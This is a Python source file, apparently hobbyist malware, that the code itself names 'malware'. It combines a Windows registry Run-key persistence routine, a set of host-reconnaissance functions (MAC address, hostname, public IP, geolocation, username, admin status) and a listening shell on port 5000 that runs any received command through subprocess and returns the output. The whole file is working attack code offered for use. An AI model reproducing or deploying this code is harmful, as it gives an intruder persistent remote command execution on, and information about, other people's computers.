


class Persistence:
    def __init__(self):
        self.check_reg()

    def add_reg(self):
        try:
            addr = os.path.join(os.getcwd(), "dist", "shell_server.exe")
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(
                reg_hkey,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, "1138 was here", 0, winreg.REG_SZ, addr)
            winreg.CloseKey(key)
        except:
            pass

    def check_reg(self):
        try:
            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(
                reg_hkey,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ,
            )
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if "1138 was here" not in v:
                    index += 1
                    continue
                return True
        except:
            winreg.CloseKey(key)
            self.add_reg()


class CommonData:
    def __innit__(self):
        pass

    @property
    def mac(self):
        try:
            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
            return mac
        except:
            return "null"

    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return "null"

    @property
    def public_ip(self):
        try:
            return (
                urllib.request.urlopen("https://api.ipify.org").read().decode("utf-8")
            )
        except:
            return "null"

    @property
    def location(self):
        """
        Return latitute/longitude of host machine (tuple)
        """
        import sys
        import json

        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib2 import urlopen
        response = urlopen("http://ipinfo.io").read()
        json_data = json.loads(response)
        latitude, longitude = json_data.get("loc").split(",")
        return "%s:%s" % (latitude, longitude)

    @property
    def machine(self):
        try:
            return platform.system()
        except:
            return "null"

    @property
    def core(self):
        try:
            return platform.machine()
        except:
            return "null"

    @property
    def public_ip_byob():
        """
        Return public IP address of host machine

        """
        import sys

        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib import urlopen
        return urlopen("http://api.ipify.org").read().decode()

    @property
    def local_ip():
        """
        Return local IP address of host machine

        """
        import socket

        return socket.gethostbyname(socket.gethostname())

    @property
    def mac_address(self):
        """
        Return MAC address of host machine

        """
        import uuid

        return ":".join(
            hex(uuid.getnode()).strip("0x").strip("L")[i : i + 2]
            for i in range(0, 11, 2)
        ).upper()

    @property
    def architecture():
        """
        Check if host machine has 32-bit or 64-bit processor architecture

        """
        import struct

        return int(struct.calcsize("P") * 8)

    @property
    def device():
        """
        Return the name of the host machine

        """
        import socket

        return socket.getfqdn(socket.gethostname())

    @property
    def username():
        """
        Return username of current logged in user

        """
        import os

        return os.getenv("USER", os.getenv("USERNAME", "user"))

    @property
    def administrator():
        """
        Return True if current user is administrator, otherwise False

        """
        import os
        import ctypes

        return bool(
            ctypes.WinDLL("shell32").IsUserAnAdmin()
            if os.name == "nt"
            else os.getuid() == 0
        )

    @property
    def ipv4(address):
        """
        Check if valid IPv4 address

        `Required`
        :param str address:   string to check

        Returns True if input is valid IPv4 address, otherwise False

        """
        import socket

        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False


class ReverseShell:
    # class variables
    HOST = "192.168.2.27"
    PORT = 5000
    BUFF_SIZE = 2048

    def __init__(self):
        p = Persistence()
        # Create tcp socket
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        # Bind socket to address
        self.s.bind((self.HOST, self.PORT))
        # Listen for connections
        self.s.listen()
        print(f"[+] Listening on {self.HOST}:{self.PORT}")
        self.client_socket, self.client_address = self.s.accept()
        print(
            f"[+] Accepted connection {self.client_address[0]}:{self.client_address[1]}"
        )
        self.main()

    def socket_init(self):
        # Accept connection (program will wait on accept until it recv a connection then we will jump to main() function)
        # client_socket: is a new socket object able to send&recv data on the connection
        # client_address: is the address bound to the socket
        self.client_socket, self.client_address = self.s.accept()
        print(
            f"[+] Accepted connection: {self.client_address[0]}:{self.client_address[1]}"
        )
        self.main()

    def send_msg(self, msg):
        # Convert string into utf-8 bytes
        msg = bytes(f"{msg}\n\n:> ", "utf-8")
        send = self.client_socket.sendall(msg)
        # Returns 'None' if sendall is successful
        return send

    def recv_message(self):
        recv = self.client_socket.recv(self.BUFF_SIZE)
        # Return value is a bytes Object representing the data received
        return recv

    def main(self):
        # Send connection message to Connected client
        if self.send_msg("[revShell] You have connected") != None:
            print("[+] Error has occured")
        # Main part of our programm, will run a continous while loop
        while True:
            try:
                msg = ""
                chunk = self.recv_message()
                msg += chunk.strip().decode("utf-8")
                # Headquarters(hq) for commands, functions, and so on using the recieved msg
                self.hq(msg)
            except:
                # Close client socket
                self.client_socket.close()
                # Go to socket_init() method and listen for connections
                self.socket_init()

    def hq(self, msg):
        try:
            if msg[:5] == "data.":
                data = CommonData()
                if msg[:10] == "data.mac":
                    self.send_msg(data.mac)
                elif msg[:13] == "data.hostname":
                    self.send_msg(data.hostname)
                elif msg[:7] == "data.ip":
                    self.send_msg(data.public_ip)
                elif msg[:13] == "data.location":
                    self.send_msg(data.location)
                elif msg[:12] == "data.machine":
                    self.send_msg(data.machine)
                elif msg[:9] == "data.core":
                    self.send_msg(data.core)
                else:
                    self.send_msg(
                        "[revShell] No data command in that name. data.ip/location/machine/core only."
                    )

            else:
                # Normal command prompt commands using the shell
                tsk = subprocess.Popen(
                    args=msg,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                )
                stdout, stderr = tsk.communicate()

                # Result from subprocess shell decoded in utf-8
                myresult = stdout.decode("latin1")

                if msg[:2] == "cd":
                    os.chdir(msg[3:])
                    self.send_msg("[revShell] *changed dir*")

                if msg[:4] == "exit":
                    # Close client socket
                    self.client_socket.close()

                    # Go to socket_init() method and listen for connections
                    self.socket_init()

                else:
                    self.send_msg(myresult)
        except Exception as e:
            self.send_msg(f"[revShell] {e}")


if __name__ == "__main__":
    malware = ReverseShell()
